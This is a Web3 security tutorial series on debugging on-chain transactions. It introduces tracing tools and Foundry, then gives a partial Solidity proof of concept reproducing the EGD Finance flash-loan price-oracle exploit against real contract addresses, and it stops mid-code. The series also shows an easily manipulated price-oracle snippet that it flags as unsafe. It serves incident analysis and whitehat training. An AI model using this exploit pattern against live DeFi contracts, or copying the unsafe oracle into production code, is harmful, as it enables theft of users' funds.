# OnChain Transaction Debugging: 1. Tools

Author: [SunSec](https://twitter.com/1nf0s3cpt)

Online resources were scarce when I started learning on-chain transaction analysis. Although slowly, l was able to piece together bits and pieces of information to perform tests and analysis.

From my studies, we will launch a series of Web3 security articles to entice more people to join Web3 security and create a secure network together.

In the first series, we will introduce how to conduct an on-chain analysis, and then we will reproduce on-chain attack(s). This skill will aid us in understanding the attack process, the root cause of the vulnerability, and even how the arbitrage robot arbitrages!

## Tools can greatly improve efficiency

Before getting into the analysis, allow me to introduce some common tools. The right tools can help you do research more efficiently.

### Transaction debugging tools

[Phalcon](https://phalcon.blocksec.com/) | [Tx.viewer](https://tx.eth.samczsun.com/) | [Cruise](https://cruise.supremacy.team/) | [Ethtx](https://ethtx.info/) | [Tenderly](https://dashboard.tenderly.co/explorer)

Transaction Viewer is the most commonly used tool, it is able to list the stack trace of function calls and the input data in each function during the transaction. Transaction viewer tools are all similar; the major difference is the chain support and auxiliary functions support. I personally use Phalcon and Sam’s Transaction Viewer. If I encounter unsupported chains, I will use Tenderly. Tenderly supports most chains, But the readability is limited, and analysis can be slow using its Debug feature. It is however one of the first tools I learned along with Ethtx.

#### Chain support comparison

Phalcon： `Ethereum、BSC、Cronos、Avalanche C-Chain、Polygon`

Sam's Transaction viewer： `Ethereum、Polygon、BSC、Avalanche C-Chain、Fantom、Arbitrum、Optimism`

Cruise： `Ethereum、BSC 、Polygon、Arbitrum、Fantom、Optimism、Avalanche、Celo、Gnosis`

Ethtx： `Ethereum、Goerli testnet`

Tendery： `Ethereum、Polygon、BSC、Sepolia、Goerli、Gnosis、POA、RSK、Avalanche C-Chain、Arbitrum、Optimism
、Fantom、Moonbeam、Moonriver`

#### Lab

We will look at JayPeggers - Insufficient validation + Reentrancy [Incident](https://github.com/SunWeb3Sec/DeFiHackLabs/#20221229---jay---insufficient-validation--reentrancy) as an example transaction [TXID](https://phalcon.blocksec.com/tx/eth/0xd4fafa1261f6e4f9c8543228a67caf9d02811e4ad3058a2714323964a8db61f6) to dissect.

First I use the Phalcon tool developed by Blocksec to illustrate. The basic information and balance changes of the transaction can be seen in the figure below. From the balance changes, we can quickly see how much profit the attacker has made. In this example, the attacker made a profit of 15.32 ETH.

![210571234-402d96aa-fe5e-4bc4-becc-190bd5a78e68-2](https://user-images.githubusercontent.com/107249780/210686382-cc02cc6a-b8ec-4cb7-ac19-402cd8ff86f6.png)

Invocation Flow Visualization - Is function invocation with trace-level information and event logs. It shows us the call invocation, the function call level of this transaction, whether flash loan is used, which projects are involved, which functions are called, and what parameters and raw data are brought in, etc.

![圖片](https://user-images.githubusercontent.com/52526645/210572053-eafdf62a-7ebe-4caa-a905-045e792add2b.png)

Phalcon 2.0 added funds flow, and Debug + source code analysis directly shows the source code, parameters, and return values along with the trace, which is more convenient for analysis.  

![image](https://user-images.githubusercontent.com/107249780/210821062-d1da8d1a-9615-4f1f-838d-34f27b9c3f41.png)

Now let's try Sam's Transaction Viewer on the same [TXID](https://tx.eth.samczsun.com/ethereum/0xd4fafa1261f6e4f9c8543228a67caf9d02811e4ad3058a2714323964a8db61f6). Sam integrates many tools in it, as shown in the picture below, you can see the change in Storage and the Gas consumed by each call.

![210574290-790f6129-aa82-4152-b3e1-d21820524a0a-2](https://user-images.githubusercontent.com/107249780/210686653-f964a682-d2a7-4b49-bafc-c9a2b0fa2c55.png)

Click Call on the left to decode the raw Input data.

![圖片](https://user-images.githubusercontent.com/52526645/210575619-89c8e8de-e2f9-4243-9646-0661b9483913.png)

Let's now switch to Tendery to analyze the same [TXID](https://dashboard.tenderly.co/tx/mainnet/0xd4fafa1261f6e4f9c8543228a67caf9d02811e4ad3058a2714323964a8db61f6), you can see the basic information like other tools. But using the Debug feature, it is not visualized and needs to be analyzed step by step. However, the advantage is that you can view the code and the conversion process of Input data while Debugging.

![圖片](https://user-images.githubusercontent.com/52526645/210577802-c455545c-80d7-4f35-974a-dadbe59c626e.png)

This can help us clarify all the things this transaction did. Before writing the POC, can we run a replay attack? Yes! Both Tendery or Phalcon support simulated transactions, you can find a button Re-Simulate in the upper right corner in the figure above. The tool will automatically fill the parameter values from the transaction for you as shown in the figure below. Parameters can be changed arbitrarily according to simulation needs, such as changing block number, From, Gas, Input data, etc.

> [!NOTE]
>
> POC（Proof of Concept，概念验证）是一个技术领域中的术语，指的是通过创建一个简单的原型或模型，验证某个想法、技术或解决方案是否可行。它通常用于开发阶段，帮助开发者或团队快速验证一个想法是否能够按预期工作，而不必构建完整的产品或系统。POC 通常包含最少的功能和复杂性，只关注核心的技术问题。

![圖片](https://user-images.githubusercontent.com/52526645/210580340-f2abf864-e540-4881-8482-f28030e5e35b.png)

### Ethereum Signature Database

[4byte](https://www.4byte.directory/) | [sig.eth](https://sig.eth.samczsun.com/) | [etherface](https://www.etherface.io/hash)

In the Raw Input data, the first 4 bytes are Function Signatures. Sometimes if Etherscan or analysis tools cannot identify the function, we may check the possible Functions through the Signature Database.

The following example assumes that we do not know what Function `0xac9650d8` is

![圖片](https://user-images.githubusercontent.com/52526645/210582149-61a6d973-b458-432f-b586-250c94c3ae24.png)

Through a sig.eth query, we find that the 4 bytes signature is `multicall(bytes[])` 

![圖片](https://user-images.githubusercontent.com/52526645/210583416-c31bbe07-fa03-4701-880d-0ae485b171f7.png)

### Useful tools

[ABI to interface](https://gnidan.github.io/abi-to-sol/) | [Get ABI for unverified contracts](https://abi.w1nt3r.xyz/) | [ETH Calldata Decoder](https://apoorvlathey.com/eth-calldata-decoder/) | [ETHCMD - Guess ABI](https://www.ethcmd.com/)

ABI to interface: When developing POC, you need to call other contracts but you need an interface. We can use this tool to help you quickly generate the interfaces. Go to Etherscan to copy the ABI, and paste it on the tool to see the generated Interface. [Example](https://etherscan.io/address/0xb3da8d6da3ede239ccbf576ca0eaa74d86f0e9d3#code).

![圖片](https://user-images.githubusercontent.com/52526645/210587442-e7853d8b-0613-426e-8a27-d70c80e2a42d.png)
![圖片](https://user-images.githubusercontent.com/52526645/210587682-5fb07a01-2b21-41fa-9ed5-e7f45baa0b3e.png)

ETH Calldata Decoder: If you want to decode Input data without the ABI, this is the tool you need. Sam's transaction viewer I introduced earlier also supports Input data decoding. 

![圖片](https://user-images.githubusercontent.com/52526645/210585761-efd8b6f1-b901-485f-ae66-efaf9c84869c.png)

Obtain ABI for unverified contracts: If you encounter a contract that is not verified, you can use this tool to try to work out the function signatures. [Example](https://abi.w1nt3r.xyz/mainnet/0xaE9C73fd0Fd237c1c6f66FE009d24ce969e98704)

![圖片](https://user-images.githubusercontent.com/52526645/210588945-701b0e22-7390-4539-9d2f-e13479b52824.png)

### Decompile tools

[Etherscan-decompile bytecode](https://etherscan.io/address/0xaE9C73fd0Fd237c1c6f66FE009d24ce969e98704#code) | [Dedaub](https://library.dedaub.com/decompile) | [heimdall-rs](https://github.com/Jon-Becker/heimdall-rs)

Etherscan has a built-in decompilation feature, but the readability of the result is often poor. Personally, I often use Dedaub, which produces better decompiled code. It is my recommended decompiler. Let's use a MEV Bot being attacked as an example You can try to decompile it for yourself using this [contract](https://twitter.com/1nf0s3cpt/status/1577594615104172033).

First, copy the Bytecodes of the unverified contract and paste it on Dedaub, and click Decompile. 

![截圖 2023-01-05 上午10 33 15](https://user-images.githubusercontent.com/107249780/210688395-927c6126-b6c1-4c6d-a0c7-a3fea3db9cdb.png)

![圖片](https://user-images.githubusercontent.com/52526645/210591478-6fa928f3-455d-42b5-a1ac-6694f97386c2.png)

If you want to learn more, you can refer to the following videos.

## Resources

[samczsun's eth txn explorer and vscode extension](https://www.youtube.com/watch?v=HXgu239mPBc)

[Vulnerabilities in DeFi by Daniel V.F.](https://www.youtube.com/watch?v=9fcOffCg2ig)

[Tenderly.co - Debug Transaction](https://www.youtube.com/watch?v=90GN9Ut8LhU)

[Reversing The EVM: Raw Calldata](https://degatchi.com/articles/reading-raw-evm-calldata)

https://web3sec.xrex.io/

# OnChain Transaction Debugging: 2. Warm up

Author: [Sun](https://twitter.com/1nf0s3cpt)

Translation: Helen

Community [Discord](https://discord.gg/3y3d9DMQ)

This article is published on XREX and [WTF Academy](https://github.com/AmazingAng/WTF-Solidity#%E9%93%BE%E4%B8%8A%E5%A8%81%E8%83%81%E5%88%86%E6%9E%90)

On-chain data can include simple one-time transfers, interactions with one DeFi contract or multiple DeFi contracts, flash loan arbitrage, governance proposals, cross-chain transactions, and more. In this section, let’s begin with a simple start.
I will introduce on BlockChain Explorer - Etherscan what we are interested in, and then use [Phalcon](https://phalcon.blocksec.com/) to compare the differences between these transaction function calls: Assets transfer, swap on UniSWAP, increase liquidity on Curve 3pool, Compound proposals, Uniswap Flashswap.

## Start to warm up

- The first step is to install [Foundry](https://github.com/foundry-rs/foundry) in the environment. Please follow the installation [instructions](https://book.getfoundry.sh/getting-started/installation).
  - Forge is a Major test tool on the Foundry platform.If it is your first time to use Foundry, you can refer to [Foundry book](https://book.getfoundry.sh/), [Foundry @EthCC](https://www.youtube.com/watch?v=wJnywGB33O4), [WTF Solidity - Foundry](https://github.com/AmazingAng/WTF-Solidity/blob/main/Topics/Tools/TOOL07_Foundry/readme.md).
- Each chain has its own blockchain explorer. In this section, we will use Ethereum's blockchain network as a case study.
- Typical information I usually refer to includes:
  - Transaction Action: Since the transfer of complex ERC-20 tokens can be difficult to discern, Transaction Action can provide the key behavior of the transfer. However, not all transactions include this information.
  - From: msg.sender, the source wallet address that executes this transaction.
  - Interacted With (To): Which contract to interact with
  - ERC-20 Token Transfer: Token Transfer Process
  - Input Data: The raw input data of the transaction. You can see what Function was called and what Value was brought in.
- If you don't know what tools are commonly used, you can view the transaction analysis tools in [the first lesson](https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/01_tools/en).

## Assets transfer

![圖片](https://user-images.githubusercontent.com/52526645/211021954-6c5828be-7293-452b-8ef6-a268db54b932.png)
The following can be derived from the [Etherscan](https://etherscan.io/tx/0x836ef3d01a52c4b9304c3d683f6ff2b296c7331b6fee86e3b116732ce1d5d124) example above:

- From: This transaction's source EOA wallet address
- Interacted With (To): Tether USD (USDT) Contract
- ERC-20 Tokens Transferred: Transfer 651.13 USDT from user A's wallet to user B
- Input Data: Called transfer function

According to [Phalcon](https://phalcon.blocksec.com/tx/eth/0x836ef3d01a52c4b9304c3d683f6ff2b296c7331b6fee86e3b116732ce1d5d124) "Invocation Flow" :

- There is only one ''Call USDT.transfer''. However, you should pay attention to the "Value".Because the Ethereum Virtual Machine (EVM) does not support floating-point operations, decimals representation is used instead.
- Each token has its own precision, the number of decimal places used to represent the value of the token. In ERC-20 tokens, the decimals are usually 18 digits, while USDT has 6 digits. If the precision of the token is not handled properly, problems will arise.
- You can query it on the Etherscan [token contract](https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7).

![圖片](https://user-images.githubusercontent.com/52526645/211123692-d7224ced-bc0b-47a1-a876-2af086e2fce9.png)

![圖片](https://user-images.githubusercontent.com/52526645/211022964-f819b35c-d442-488c-9645-7733af219d1c.png)

## Uniswap Swap

![圖片](https://user-images.githubusercontent.com/52526645/211029091-c24963c7-d2f8-44f4-ad6a-a9185f98ec85.png)

The following can be derived from the [Etherscan](https://etherscan.io/tx/0x1cd5ceda7e2b2d8c66f8c5657f27ef6f35f9e557c8d1532aa88665a37130da84) example above:

- Transaction Action: A user performs Swap on Uniswap V2, exchanging 12,716 USDT for 7,118 UNDEAD.
- From: This transaction's source wallet address
- Interacted With (To): A MEV Bot contract called Uniswap contract for Swap.
- ERC-20 Tokens Transferred: Token exchange process

According to [Phalcon](https://phalcon.blocksec.com/tx/eth/0x1cd5ceda7e2b2d8c66f8c5657f27ef6f35f9e557c8d1532aa88665a37130da84) "Invocation Flow" :

- MEV Bot calls the Uniswap V2 USDT/UNDEAD trading pair contract to call the swap function to perform token exchange.

![圖片](https://user-images.githubusercontent.com/52526645/211029737-4a606d32-2c96-41e9-aef7-82fe1fb4b21d.png)

### Foundry

We use Foundry to simulate the operation of using 1BTC to exchange for DAI in Uniswap.

- [Sample code reference](https://github.com/SunWeb3Sec/DeFiLabs/blob/main/src/test/Uniswapv2.sol), execute the following command:

```sh
forge test --contracts ./src/test/Uniswapv2.sol -vvvv
```

- According to the figure - we swap 1 BTC to 16,788 DAI by calling the Uniswap\_v2\_router.[swapExactTokensForTokens](https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02#swapexacttokensfortokens) function.

![圖片](https://user-images.githubusercontent.com/52526645/211143644-6ed295f0-e0d8-458b-a6a7-71b2da8a5baa.png)

## Curve 3pool - DAI/USDC/USDT

![圖片](https://user-images.githubusercontent.com/52526645/211030934-14fccba9-5239-480c-b431-21de393a6308.png)

The following can be derived from the [Etherscan](https://etherscan.io/tx/0x667cb82d993657f2779507a0262c9ed9098f5a387e8ec754b99f6e1d61d92d0b) example above:

- The purpose of this transaction is to add Liquidity at Curve three pools.
- From: This transaction's source wallet address
- Interacted With (To): Curve.fi: DAI/USDC/USDT Pool
- ERC-20 Tokens Transferred: User A transferred 3,524,968.44 USDT to the Curve 3 pools, and then Curve minted 3,447,897.54 3Crv tokens for User A.

According to [Phalcon](https://phalcon.blocksec.com/tx/eth/0x667cb82d993657f2779507a0262c9ed9098f5a387e8ec754b99f6e1d61d92d0b) "Invocation Flow" :

- Based on the call sequence, three steps were executed:
  1.add\_liquidity 2.transferFrom 3.mint.

![圖片](https://user-images.githubusercontent.com/52526645/211032540-b8ad83af-44cf-48ea-b22c-6c79d4dac1af.png)


## Compound propose

![圖片](https://user-images.githubusercontent.com/52526645/211033609-60713c9d-1760-45d4-957f-a74e08abf9a5.png)

The following can be derived from the [Etherscan](https://etherscan.io/tx/0xba69b455c511c500e0be9453cf70319bc61e29eb4235a6e5ca5fe6ddf1934159) example above:

- The user submitted a proposal on the Compound. The contents of the proposal can be viewed by clicking "Decode Input Data" on Etherscan.

![圖片](https://user-images.githubusercontent.com/52526645/211033906-e3446f69-404e-4347-a0c6-e1b622039c5a.png)

According to [Phalcon](https://phalcon.blocksec.com/tx/eth/0xba69b455c511c500e0be9453cf70319bc61e29eb4235a6e5ca5fe6ddf1934159) "Invocation Flow" :

- Submitting a proposal through the propose function results in proposal number 44.

![圖片](https://user-images.githubusercontent.com/52526645/211034346-a600cbf4-eed9-47ca-8b5a-88232808f3a3.png)

## Uniswap Flashswap

Here we use Foundry to simulate operations - how to use flash loans on Uniswap. [Official Flash swap introduction](https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps)

- [Sample Code](https://github.com/SunWeb3Sec/DeFiLabs/blob/main/src/test/Uniswapv2_flashswap.sol) Reference, execute the following command:

```sh
forge test --contracts ./src/test/Uniswapv2_flashswap.sol -vv
```

![圖片](https://user-images.githubusercontent.com/52526645/211125357-695c3fd0-4a56-4a70-9c98-80bac65586b8.png)

- In this example, a flash loan of 100 WETH is borrowed through the Uniswap UNI/WETH exchange. Note that a 0.3% fee must be paid on repayments.
- According to the figure - call flow, flashswap calls swap, and then repays by calling back uniswapV2Call.

![圖片](https://user-images.githubusercontent.com/52526645/211038895-a1bc681a-41cd-4900-a745-3d3ddd0237d4.png)

- Further Introduction to Flashloan and Flashswap:

  - A. Common points:
    Both can lend Tokens without collateralizing assets, and they need to be returned in the same block, otherwise the transaction fails.

  - B. The difference:
    If token0 is borrowed through Flashloan token0/token1, token0 must be returned. Flashswap lends token0, and you can return token0 or token1, which is more flexible.

For more DeFi basic operations, please refer to [DeFiLab](https://github.com/SunWeb3Sec/DeFiLabs).

## Foundry cheatcodes

Foundry's cheatcodes are essential for conducting chain analysis. Here, I will introduce some commonly used functions. More information can be found in the [Cheatcodes Reference](https://book.getfoundry.sh/cheatcodes/).

- createSelectFork: Specifies a network and block height to copy for testing. Must include the RPC for each chain in [foundry.toml](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/foundry.toml).
- deal: Sets the balance of a test wallet.
  - Set ETH balance:  `deal(address(this), 3 ether);`
  - Set Token balance: `deal(address(USDC), address(this), 1 * 1e18);`
- prank: Simulate the identity of a specified wallet. It is only effective for the next call and will set the msg.sender to the specified wallet address. Such as simulating a transfer from a whale wallet.
- startPrank: Simulate the identity of a specified wallet. It will set the msg.sender to the specified wallet address for all calls until `stopPrank()` is executed.
- label: Labels a wallet address for improved readability when using Foundry debug.
- roll: Adjusts the block height.
- warp: Adjusts the block timestamp.

Thanks for following along! Time to jump into the next lesson.

## Resources

[Foundry book](https://book.getfoundry.sh/)

[Awesome-foundry](https://github.com/crisgarner/awesome-foundry)

[Flashloan vs Flashswap](https://blog.infura.io/post/build-a-flash-loan-arbitrage-bot-on-infura-part-i)

# OnChain Transaction Debugging: 3. Write Your Own PoC (Price Oracle Manipulation)

Author: [▓▓▓▓▓▓](https://twitter.com/h0wsO1)

Translation: [Simon](https://www.linkedin.com/in/tysliu/) ＆ [Helen](https://www.linkedin.com/in/helen-l-25b7a41a8/) 

In [01_Tools](https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/01_tools/en), we learned how to use various tools to analyze transactions in smart contracts.

In  [02_Warm](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/academy/onchain_debug/02_warmup/en/readme.md), we analyzed a transaction on a decentralized exchange using Foundry.

For this publication, we will analyze a hacker incident utilizing an oracle exploit. We’ll take you step-by-step through key function calls and then we’ll reproduce the attack together using the Foundry framework.


## Why is Reproducing Attacks Helpful?

At DeFiHackLabs we intend to promote Web3 security. We hope that when attacks happen, more people can analyze and contribute to overall security.

1. As unfortunate victims we improve our incident response and effectiveness.
2. As a whitehat we improve our ability in writing PoCs and snatch bug bounties. 
3. Aid the blue team in adjusting machine learning models. Ie., [Forta Network](https://forta.org/blog/how-fortas-predictive-ml-models-detect-attacks-before-exploitation/).
4. You’ll learn much more from reproducing the attack compared to reading post-mortems.
5. Improve your overall Solidity ”Kung Fu“.

### Some Need-to-knows Before Reproducing Transactions

1. Understanding of common attack modes. Which we have curated in [DeFiVulnLabs](https://github.com/SunWeb3Sec/DeFiVulnLabs).
2. Understanding of basic DeFi mechanisms including how smart contracts interact with each other.

### DeFi Oracle Introduction

Currently, smart contract values such as pricing and configuration cannot update themselves. To execute its contract logic, external data is sometimes required during execution. This is typically done with the following methods.

1. Through externally owned accounts. We can calculate the price based on the reserves of these accounts.
2. Use an oracle, which is maintained by someone or even yourself. With external data updated periodically. ie., price, interest rate, anything. 

* For example, in Uniswap V2, they provide the current price of the asset, which is used to determine the relative value of the asset being traded and thus execute the trade.

  * Following the figure, ETH price is the external data. The smart contract obtains it from Uniswap V2.

    We know the formula  `x * y = k` in a typical AMM. `x` ( ETH price in this case) =  `k / y`.

    So we take a look at the Uniswap V2 WETH/USDC trading pair contract. At this address `0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc`.

![UniV2PairInfo](https://user-images.githubusercontent.com/26408530/211231355-0d1fb43e-280e-4328-b71e-9797be5ce7ec.png)

* At the time of publication we see the following reserve values:

  * WETH: `33,906.6145928`  USDC: `42,346,768.252804` 

  * Formula: Applying the `x * y = k` formula will yield the price for each ETH:

    `42,346,768.252804 / 33,906.6145928 = 1248.9235`

   (Market prices may differ from the calculated price by a few cents. In most cases, this refers to a trading fee or a new transaction that affects the pool. This variance can be skimmed with `skim()`[^1].)

  * Solidity Pseudocode: For the lending contract to fetch the current ETH price, the pseudocode can be as the following:

```solidity=
uint256 UniV2_ETH_Reserve = WETH.balanceOf(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc);
uint256 UniV2_USDC_Reserve = USDC.balanceOf(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc);
uint256 ETH_Price = UniV2_USDC_Reserve / UniV2_ETH_Reserve;
```

   > #### Please note this method of obtaining price is easily manipulated. Please do not use it in the production code.

[^1]: Skim() :

Uniswap V2 is a decentralized exchange(DEX) that uses a liquidity pool to trade assets. It has a `skim()`function as a safety measure to protect against potential issues from customized token implementations that may change the balance of the pair contract. However, `skim()`can also be used in conjunction with price manipulation.
Please see the figure for a full explanation of Skim().
![截圖 2023-01-11 下午5 08 07](https://user-images.githubusercontent.com/107821372/211970534-67370756-d99e-4411-9a49-f8476a84bef1.png)
Image source / [Uniswap V2 Core whitepaper](https://uniswap.org/whitepaper.pdf)

* For more information, you could following below the resources
  * Uniswap V2 AMM mechanisms: [Smart Contract Programmer](https://www.youtube.com/watch?v=Ar4Ik7Bov0U).
  * Oracle manipulation: [WTFSolidity](https://github.com/WTFAcademy/WTF-Solidity/blob/main/S15_OracleManipulation/readme.md).

### Oracle Price Manipulation Attack Modes

Most common attack modes:

1. Alter the oracle address

   * Root cause: lack of verification mechanism
   * For example: [Rikkei Finance](https://github.com/SunWeb3Sec/DeFiHackLabs#20220415-rikkei-finance---access-control--price-oracle-manipulation)

2. Through flash loans, an attacker can drain liquidity, resulting in wrong pricing information in an oracle.

   * This is most often seen in attackers calling these functions. GetPrice、Swap、StackingReward, Transfer(with burn fee), etc.
   * Root cause: Protocols using unsafe/compromised oracles, or the oracle did not implement time-weighted average price features.
   * Example: [One Ring Finance](https://github.com/SunWeb3Sec/DeFiHackLabs#20220321-onering-finance---flashloan--price-oracle-manipulation)

   >  Protip-case 2: During code review ensure the function`balanceOf()`is well guarded.

---

## Step-by-step PoC - An Example from EGD Finance

### Step 1: Information gathering

* Upon discovery of an attack. Twitter will often be the front line of the aftermath. Top DeFi analysts will continuously publish their new findings there.

> Protip: Join the [DeFiHackLabs Discord](https://discord.gg/Fjyngakf3h) security-alert channel to receive curated updates from top DeFi analysts!

* Upon an attack incident, it is important to gather and organize the newest information. Here is a template!
  1. Transaction ID
  2. Attacker Address(EOA)
  3. Attack Contract Address
  4. Vulnerable Address
  5. Total Loss
  6. Reference Links
  7. Post-mortem Links
  8. Vulnerable snippet
  9. Audit History

> Protip: Use the [Exploit-Template.sol](/script/Exploit-template.sol) template from DeFiHackLabs.

---

### Step 2: Transaction Debugging

Based on experience, 12 hours after the attack, 90% of the attack autopsy will have been completed. It’s usually not too difficult to analyze the attack at this point.

* We will use a real case of [EGD Finance Exploit attack](https://twitter.com/BlockSecTeam/status/1556483435388350464) as an example, to help you understand :
  1. the risk in oracle manipulation.
  2. how to profit from oracle manipulation.
  3. flash loans transaction.
  4. how attackers reproduce by only 1 transaction to accomplish the attack.

* Let's use [Phalcon](https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3) from Blocksec to analyze the EGD Finance incident.
  <img width="1644" alt="Screenshot 2023-01-11 at 4 59 15 PM" src="https://user-images.githubusercontent.com/107821372/211762771-d2c54800-4595-4630-9392-30431094bfca.png">

* In Ethereum EVM, you will see 3 call types to trigger remote functions:
  1. Call: Typical cross-contract function call, will often change the receiver’s storage.
  2. StaticCall: Will not change the receiver’s storage, used for fetching state and variables.
  3. DelegateCall: `msg.sender`  will remain the same, typically used in proxying calls. Please see [WTF Solidity](https://github.com/WTFAcademy/WTF-Solidity/tree/main/23_Delegatecall) for more details.

> Please note, internal function calls[^2] are not visible in Ethereum EVM.

[^2]: Internal function calls are invisible to the blockchain since they don't create any new transactions or blocks. In this way, they cannot be read by other smart contracts or show up in the blockchain transaction history.

* Further Information - Attackers Flash loan attack mode
  1. Check if the attack will be profitable. First, ensure loans can be obtained, then ensure the target has enough balance.
     - This means you will see some 'static calls' in the beginning.
  2. Use DEX or Lending Protocols to obtain a flash loan, look for the following key function calls
     - UniswapV2, Pancakeswap: `.swap()`
     - Balancer: `flashLoan()`
     - DODO: `.flashloan()`
     - AAVE: `.flashLoan()`
  3. Callbacks from flash loan protocol to attacker’s contract, look for the following key function calls
     - UniswapV2: `.uniswapV2Call()`
     - Pancakeswap: `.Pancakeswap()`
     - Balancer: `.receiveFlashLoan()`
     - DODO: `.DXXFlashLoanCall()`
     - AAVE: `.executeOperation()`
   4. Execute the attack to profit from contract weakness.
   5. Return the flash loan

### Practice: 

Identify various stages of the EGD Finance Exploit attack on [Phalcon](https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3). More specifically ‘flashloan‘, ’callback‘, ’weakness‘, and ’profit’.

`Expand Level: 3`
<img width="1898" alt="TryToDecodeFromYourEyes" src="https://user-images.githubusercontent.com/26408530/211231441-b5cd2cd8-a438-4344-b014-6b8e92ab2532.png">

>Protip: If you are unable to understand the logic of individual function calls. Try tracing through the entire call stack sequentially, take notes, and pay special attention to the money trail. You’ll have a much better understanding after doing this a few times.

<details><summary>The Answer</summary>


<img width="1589" alt="Screenshot 2023-01-12 at 1 58 02 PM" src="https://user-images.githubusercontent.com/107821372/211996295-063f4c64-957a-4896-8736-c4dbbc082272.png">

</details>


### Step 3: Reproduce code

After analysis of the attack transaction function calls, let’s now try to reproduce some code:

#### Step A. Complete fixtures.

<details><summary>Click to show the code</summary>


```solidity=
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo - Total Lost : ~36,044 US$
// Attacker : 0xee0221d76504aec40f63ad7e36855eebf5ea5edd
// Attack Contract : 0xc30808d9373093fbfcec9e026457c6a9dab706a7
// Vulnerable Contract : 0x34bd6dba456bc31c2b3393e499fa10bed32a9370 (Proxy)
// Vulnerable Contract : 0x93c175439726797dcee24d08e4ac9164e88e7aee (Logic)
// Attack Tx : https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code#F1#L254
// Stake Tx : https://bscscan.com/tx/0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8

// @Analysis
// Blocksec : https://twitter.com/BlockSecTeam/status/1556483435388350464
// PeckShield : https://twitter.com/PeckShieldAlert/status/1556486817406283776

// Declaring a global variable must be of constant type.
CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
IPancakePair constant USDT_WBNB_LPPool = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
IPancakePair constant EGD_USDT_LPPool = IPancakePair(0xa361433E409Adac1f87CDF133127585F8a93c67d);
IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;
address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98;

contract Attacker is Test { // simulated attacker(EOA)
    Exploit exploit = new Exploit();

    constructor() { // can also be replaced with ‘function setUp() public {}
        // Labels can be used to tag wallet addresses, making them more readable when using the 'forge test -vvvv' command."
        cheat.label(address(USDT_WBNB_LPPool), "USDT_WBNB_LPPool");
        cheat.label(address(EGD_USDT_LPPool), "EGD_USDT_LPPool");
        cheat.label(address(pancakeRouter), "pancakeRouter");
        cheat.label(EGD_Finance, "EGD_Finance");
        cheat.label(usdt, "USDT");
        cheat.label(egd, "EGD");
        /* ------------------------------------------------------------------------------------------- */
        cheat.roll(20245539); //Note: The attack transaction must be forked from the previous block, as the victim contract state has not yet been modified at this time.
        console.log("-------------------------------- Start Exploit ----------------------------------");
    }
}
```

</details>
<br>

#### Step B. Simulate an attacker calling the harvest function

<details><summary>Click to show the code</summary>


```solidity=
contract Attacker is Test { // simulated attacker(EOA)
    Exploit exploit = new Exploit();

    constructor() {
        // Labels can be used to tag wallet addresses, making them more readable when using the 'forge test -vvvv' command.
        cheat.label(address(USDT_WBNB_LPPool), "USDT_WBNB_LPPool");
        cheat.label(address(EGD_USDT_LPPool), "EGD_USDT_LPPool");
        cheat.label(address(pancakeRouter), "pancakeRouter");
        cheat.label(EGD_Finance, "EGD_Finance");
        cheat.label(usdt, "USDT");
        cheat.label(egd, "EGD");
        /* ------------------------------------------------------------------------------------------- */
        cheat.roll(20245539); //The attack transaction must be forked from the previous block, as the victim contract state has not yet been modified at this time.
        console.log("-------------------------------- Start Exploit ----------------------------------");
    }
 
    function testExploit() public { // To be executed by Foundry testcases, it must be named "test" at the start.
        //To observe the changes in the balance, print out the balance first, before attacking.
        emit log_named_decimal_uint("[Start] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[INFO] EGD/USDT Price before price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
        emit log_named_decimal_uint("[INFO] Current earned reward (EGD token)", IEGD_Finance(EGD_Finance).calculateAll(address(exploit)), 18);
        
        console.log("Attacker manipulating price oracle of EGD Finance...");
        exploit.harvest(); //A simulation of an EOA call attack
        console.log("-------------------------------- End Exploit ----------------------------------");
        emit log_named_decimal_uint("[End] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
    }
}
/* -------------------- Interface -------------------- */
interface IEGD_Finance {
    function calculateAll(address addr) external view returns (uint);
}
```

</details>
<br>

#### Step C. Complete part of the attack contract

<details><summary>Click to show the code</summary>


```solidity=
/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test{ // attack contract
    uint256 borrow1;

    function harvest() public {        
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); //獲利了結
    }

    
	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] received");

        // Weakness exploit...

